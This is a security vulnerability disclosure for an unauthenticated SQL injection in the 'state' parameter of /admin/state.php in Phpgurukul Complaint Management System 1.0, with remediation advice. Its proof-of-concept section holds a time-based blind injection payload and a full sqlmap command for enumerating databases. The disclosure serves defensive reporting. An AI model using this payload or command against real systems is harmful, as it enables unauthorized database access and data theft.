# Security Vulnerability Disclosure

## Project Information
+ Product Name: Complaint Management System
+ Version: 1.0
+ Vendor Website: Complaint Management System
+ Source Code Download: Download Here

## Reporter Details
+ Reported By: angrysheep

## Vulnerability Overview

+ A severe SQL Injection vulnerability has been identified in the /admin/state.php file of the Phpgurukul Complaint Management System v1.0. This flaw allows attackers to inject malicious SQL code through the state parameter without requiring any form of authentication, potentially leading to unauthorized data access, data manipulation, and complete system compromise.

# Technical Analysis

## Vulnerability Type
+ SQL Injection

## Affected Endpoint
+ File Path: /admin/state.php
+ Parameter Vulnerable: state

## Root Cause

+ The vulnerability arises because the application directly embeds user-supplied input from the state parameter into SQL queries without implementing adequate sanitization or validation mechanisms. This oversight permits attackers to manipulate the SQL query structure by injecting malicious code, thereby executing unintended database operations.

## Impact Assessment

**Exploiting this SQL Injection vulnerability can result in:**
+ **Unauthorized Data Access:** Attackers can retrieve sensitive information from the database.
+ **Data Breach:** Exposure of confidential data, including user information.
+ **Data Manipulation:** Ability to alter or delete existing data.
+ **System Compromise:** Potential for complete takeover of the application and underlying server.
+ **Denial of Service:** Disruption of services through malicious queries that overload the database.

These consequences pose a critical threat to both the security and functionality of the affected system.

# Proof of Concept (PoC)

## Malicious Payload Example
```bash
state=123' AND (SELECT 1249 FROM (SELECT(SLEEP(5)))EKMQ) AND 'zTlX'='zTlX&description=123&submit=
```

**Exploitation Steps Using sqlmap**
**1.Identify the Vulnerable Parameter:**
+ The state parameter in the /admin/state.php file is susceptible to SQL Injection.
**2.Execute the Attack with sqlmap:**
```bash
sqlmap.py -u "192.168.134.167:1111/admin/state.php" \
         --data="state=123&description=123&submit=" \
         --batch --level=5 --risk=3 --dbms=mysql \
         --random-agent --tamper=space2comment --dbs
```

**3.Observation:**
+ The injected payload causes a delay (SLEEP(5)), indicating successful exploitation.

**Execution Evidence**
+ ![image](https://github.com/user-attachments/assets/b0c97777-89f5-49d1-829a-cdb2f5920ea9)

## Remediation Recommendations

To mitigate the identified SQL Injection vulnerability, the following actions are recommended:
**1.Implement Prepared Statements and Parameterized Queries**
+ Utilize prepared statements to ensure that user inputs are treated strictly as data, not executable code. This effectively separates SQL logic from user-supplied data.
**2.Enforce Input Validation and Sanitization**
+ Rigorously validate and sanitize all user inputs to ensure they conform to expected formats and types before processing. Reject or properly handle any anomalous input.
**3.Adopt the Principle of Least Privilege**
+ Configure database user accounts with the minimal necessary permissions required for their function. Avoid using high-privilege accounts (e.g., root, admin) for routine database operations.
**4.Conduct Regular Security Audits and Code Reviews**
+ Perform periodic security assessments and code reviews to identify and remediate potential vulnerabilities proactively. Utilize automated tools and manual testing to enhance coverage.
**5.Implement Web Application Firewalls (WAF)**
+ Deploy a WAF to monitor and filter malicious traffic, providing an additional layer of defense against SQL Injection and other common web vulnerabilities.

## Conclusion

The discovered SQL Injection vulnerability in the Phpgurukul Complaint Management System poses a significant risk to the application’s integrity and the confidentiality of its data. Immediate remediation is essential to safeguard against potential exploitation and to maintain the trust of users relying on the system.

**Additional Resources**
+ [Complaint Management System Homepage](https://phpgurukul.com/complaint-management-sytem/)
+ [Download Complaint Management System Source Code](https://phpgurukul.com/wp-content/uploads/2017/12/Complaint-Management-System-PHP.zip)

**Disclaimer: This report is intended solely for the responsible disclosure of security vulnerabilities to the affected vendor. Unauthorized use or distribution of this information is prohibited.**
